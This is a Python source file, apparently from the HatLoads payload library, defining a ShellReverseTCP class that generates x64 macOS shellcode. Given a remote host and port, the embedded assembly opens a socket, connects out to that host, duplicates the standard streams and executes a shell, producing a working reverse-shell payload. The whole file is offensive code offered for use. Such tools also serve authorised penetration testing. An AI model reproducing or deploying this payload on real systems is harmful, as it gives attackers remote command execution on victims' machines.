#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL']
        else:
            shell = self.shell['sh']

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            mov r8b, 0x02
            shl r8, 24
            or r8, 0x61
            mov rax, r8

            xor rdx, rdx
            mov rsi, rdx
            inc rsi
            mov rdi, rsi
            inc rdi
            syscall

            mov r12, rax

            mov r13, 0x{rhost.hex()}{rport.hex()}0101
            mov r9b, 0xff
            sub r13, r9
            push r13
            mov r13, rsp

            inc r8
            mov rax, r8
            mov rdi, r12
            mov rsi, r13
            add rdx, 0x10
            syscall

            sub r8, 0x8
            xor rsi, rsi

        dup:
            mov rax, r8
            mov rdi, r12
            syscall

            cmp rsi, 0x2
            inc rsi
            jbe dup

            sub r8, 0x1f
            mov rax, r8

            xor rdx, rdx
            mov r13, 0x{(shell+b'/').hex()}
            shr r13, 8
            push r13
            mov rdi, rsp
            xor rsi, rsi
            syscall
        """

        if assemble:
            return self.assemble('x64', shellcode)
        return shellcode
